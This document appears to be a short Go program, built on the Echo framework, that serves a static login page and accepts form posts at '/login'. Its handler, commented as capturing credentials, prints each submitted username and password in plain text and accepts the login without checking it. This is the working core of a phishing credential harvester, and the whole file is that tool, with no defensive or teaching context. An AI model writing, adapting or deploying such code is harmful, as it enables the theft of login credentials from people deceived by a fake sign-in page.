package main

import (
	"fmt"
	"github.com/labstack/echo/v4"
	"net/http"
)

func main() {

	e := echo.New()

	// serve static files (css, JS, images )
	e.Static("/", "static")

	// serve login page
	e.GET("/", serveLoginPage)

	//  POST handler to capture credentials
	e.POST("/login", handleLogin)

	e.Logger.Fatal(e.Start(":8080"))

}

// serveLoginPage serves the login HTML page
func serveLoginPage(c echo.Context) error {
	return c.File("static/index.html")
}

// handleLogin handles login form submission
func handleLogin(c echo.Context) error {
	// Example: parse form values
	username := c.FormValue("username")
	password := c.FormValue("password")

	fmt.Printf("Captured: username=%s, password=%s\n", username, password)

	return c.String(http.StatusOK, "Login received")

}
